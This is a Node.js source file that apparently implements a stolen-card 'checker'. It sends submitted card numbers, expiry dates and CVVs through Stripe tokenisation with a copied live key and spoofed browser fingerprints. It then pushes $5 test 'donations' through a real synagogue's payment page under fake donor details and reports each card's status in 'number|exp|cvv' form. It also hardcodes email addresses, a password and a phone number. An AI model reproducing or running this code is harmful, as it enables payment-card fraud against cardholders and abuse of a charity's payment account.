const axios = require('axios');
const { chromium } = require("@playwright/test");
const { isLuhnValid } = require("../helps/index.js");
const cheerio = require('cheerio');

const charges = async (req, res) => {
  const { cardNumber, cardExpiry, cardCvv, name } = req.body
  const emails = [
    "Nueva.amapasa@outlook.com",
    "juanjoseamapa@gmail.com",
    "juanjoseamapasa@gmail.com",
    "master.bineta@gmail.com",
    "alejandroamapa@gmail.com"
  ]
  const password = "Sanchez1."
  const email = emails[Math.floor(Math.random() * 5)]

  async function CheckCard() {
    try {
      const isCardNumberValid = isLuhnValid(cardNumber);
      if (!isCardNumberValid) {
        return res.json({
          card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
          status: "invalid_card_number",
          error: true,
        })
      }
      const cardExpiryMes = cardExpiry.split('|')[0]
      const cardExpiryAnio = cardExpiry.split('|')[1]
      // console.log(cardNumber)
      // console.log(cardExpiryMes)
      // console.log(cardExpiryAnio)
      // console.log(cardCvv)

      const url = "https://api.stripe.com/v1/tokens";
      const headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
      };

      const data = new URLSearchParams({
        "guid": "b094041a-9d93-47ac-808b-67fa048c9c79cffbe1",
        "muid": "1bbbe87e-aacf-4839-81c5-ae1b8414091b045ffd",
        "sid": "01a17e99-14b8-47f2-b0fd-ed73b7f975f10eaf1e",
        "referrer": "https://adath.com",
        "time_on_page": 116704,
        "card[number]": cardNumber,
        "card[cvc]": cardCvv,
        "card[exp_month]": cardExpiryMes,
        "card[exp_year]": cardExpiryAnio,
        "card[address_zip]": "10090",
        "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
        "key": "pk_live_hfa8n6GiIulubXWLlxKFT2Nk00HemDDv0u",
        "pasted_fields": "number"
      });

      const response = await axios.post(url, data.toString(), { headers });
      const stripeToken = response.data.id
      // console.log(stripeToken);

      const urlCharge = "https://adath.com/pay/charge";
      const headersCharge = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
      };
      const dataCharge = new URLSearchParams({
        "first-name": "Raul",
        "last-name": "Asencio",
        "email": "juanjoseama@gmail.com",
        "phone": "6674278938",
        "amount": "USD 5.00",
        "note": "",
        "description": "Donation",
        "stripeToken": stripeToken
      });

      const responseCharge = await axios.post(urlCharge, dataCharge.toString(), { headers: headersCharge });
      // console.log('response', responseCharge.data);
      // console.log("STATUS CODE:", responseCharge.status);
      // console.log("HTML LENGTH:", responseCharge.data.length);
      // console.log("HTML PREVIEW:", responseCharge.data.slice(0, 500));
      if (responseCharge.status === 200) {
        console.log("Cargando cheerio...")
        const $ = cheerio.load(responseCharge.data);

        const excludeTexts = [
          "Adath Israel Synagogue2337 Edgcumbe RoadSt. Paul, Minnesota 55116-2766",
          "CALL651-698-8300FAX 651-690-1144",
          "Rabbi Asher Zeilingoldrabbiz@adath.com"
        ];

        $('h4').each((index, element) => {
          const text = $(element).text().trim();
          if (!excludeTexts.includes(text)) {
            console.log(`MENSAJE: "${text.toUpperCase()}"`);
          }
        });

        $('p').each((index, element) => {
          const text = $(element).text().trim();
          if (!excludeTexts.includes(text)) {
            console.log(`MENSAJE: "${text.toUpperCase()}"`);
          }
        });
      } else {
        console.log(`ERROR EN LA SOLICITUD: ${responseCharge.status}`);
      }

      setTimeout(async () => {
        return res.json({
          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
          status: 'TimeoutError',
          error: true
        });
      }, 17000);
      // return res.json({
      //   card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
      //   status: 'TimeoutError',
      //   error: true
      // });
    } catch (error) {
      console.log(error);
      return res.status(500).send({
        card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
        status: "Ocurrio un error",
        error: true
      })
    }
  }
  return await CheckCard();
};

const auth = async (req, res) => {
  const { cardNumber, cardExpiry, cardCvv, name } = req.body
  const email = "juanjoseamapa@gmail.com"
  const password = "Sanchez1."

  async function CheckCard() {
    try {
      const isCardNumberValid = isLuhnValid(cardNumber);
      if (!isCardNumberValid) {
        return res.json({
          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
          status: "invalid_card_number",
          error: true,
        })
      }

      const browser = await chromium.launch({ headless: true, });
      const context = await browser.newContext();
      const page = await context.newPage();

      await page.goto('https://mobile-check.vercel.app/');

      const textoCount = await page.locator('p.text-center.text-3xl').count();
      console.log(textoCount)
      if (textoCount > 0) {
        const texto = await page.locator('p.text-center.text-3xl').nth(1).innerText();
        await page.close();
        await browser.close();
        return res.json({
          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
          status: texto,
          error: true
        });
      }

      setTimeout(async () => {
        await page.close();
        await browser.close();
        return res.json({
          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
          status: 'TimeoutError',
          error: true
        });
      }, 15000);
    } catch (error) {
      console.log(error);
      return res.status(500).send({
        card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
        status: "Ocurrio un error",
        error: true
      })
    }
  }
  return await CheckCard();
};

module.exports = {
  charges,
  auth,
}

